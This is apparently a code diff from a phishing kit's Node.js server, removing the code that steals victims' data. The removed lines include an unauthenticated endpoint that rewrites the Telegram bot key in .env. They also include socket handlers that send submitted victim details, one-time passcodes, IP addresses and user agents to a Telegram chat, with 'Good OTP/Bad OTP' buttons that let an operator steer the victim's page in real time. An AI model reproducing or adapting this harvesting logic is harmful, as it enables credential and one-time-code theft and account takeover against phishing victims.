@@ -166,28 +166,6 @@ app.get('/finish', checkRecaptchaSession, (req, res) => {
     res.sendFile(join(__dirname, '/cp/finish/page.html'));
 });
 
-app.post('/change', (req, res) => {
-    const { TELEGRAM_BOT_API_KEY, TELEGRAM_CHAT_ID } = req.body;
-
-    // Read the current .env file
-    fs.readFile('.env', 'utf8', (err, data) => {
-        if (err) {
-            return res.status(500).send('Error reading .env file');
-        }
-
-        // Update TELEGRAM_BOT_API_KEY and TELEGRAM_CHAT_ID values
-        let updatedData = data.replace(/^TELEGRAM_BOT_API_KEY=.*$/m, `TELEGRAM_BOT_API_KEY=${TELEGRAM_BOT_API_KEY}`);
-        updatedData = updatedData.replace(/^TELEGRAM_CHAT_ID=.*$/m, `TELEGRAM_CHAT_ID=${TELEGRAM_CHAT_ID}`);
-
-        // Write the updated data back to .env
-        fs.writeFile('.env', updatedData, 'utf8', (err) => {
-            if (err) {
-                return res.status(500).send('Error writing .env file');
-            }
-            res.send('Environment variables updated');
-        });
-    });
-});
 
 
 // ====================
@@ -195,55 +173,7 @@ app.post('/change', (req, res) => {
 // ====================
 io.on('connection', (socket, req) => {
 
-    let user = null;
-    let userIP = socket.request.headers['x-forwarded-for'];
-    if (userIP) {
-        // Split the string by comma and take the first element
-        userIP = userIP.split(',')[0].trim();
-    } else {
-        // Fallback to remoteAddress if x-forwarded-for is not set
-        userIP = userIP.request.connection.remoteAddress;
-    }
-    
-    socket.join(userIP)
-
-    socket.on('submit', (data) => {
-        if(userIP){
-            user = data
-            user.ip = userIP
-            let message = JSON.stringify(user, null, 2);
-            bot.sendMessage(chatId, message);
-        }
-       
-        //console.log(data)
-    })
-
-    socket.on('otp', (data) => {
-      
-        const opts = {
-            reply_markup: {
-                inline_keyboard: [
-                    [{ text: 'Good OTP', callback_data: `good:${userIP}`}],
-                    [{ text: 'Bad OTP', callback_data: `bad:${userIP}` }]
-                ]
-            }
-        };
-        bot.sendMessage(chatId, `OTP: ${data.otp}\n\nIP: ${userIP} \nUserAgent: ${data.userAgent}`, opts);
-    })
-
-    bot.on('callback_query', function onCallbackQuery(callbackQuery) {
-        const splitData = callbackQuery.data.split(":");
-        const action = splitData[0]
-        const ip = splitData[1]
-        const msg = callbackQuery.message;
-
-        let data = {
-            action : action
-        }
-
-        io.to(ip).emit('choice', data)
-    });
-
+    console.log('Connection !')
 
 });
 
